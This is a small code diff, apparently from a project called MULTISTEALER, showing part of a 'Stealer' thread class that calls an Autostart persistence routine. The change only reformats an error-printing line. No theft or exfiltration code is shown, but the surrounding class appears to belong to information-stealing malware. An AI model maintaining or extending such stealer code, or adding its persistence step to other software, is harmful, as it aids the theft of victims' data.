@@ -122,6 +122,4 @@ class Stealer(Thread):
             Autostart(argv[0], (self.autostart,), self.errors).run()
 
         except Exception as e:
-
-            if self.errors is True:
-                print(f"[MULTISTEALER]: {repr(e)}")
+            if self.errors is True: print(f"[MULTISTEALER]: {repr(e)}")
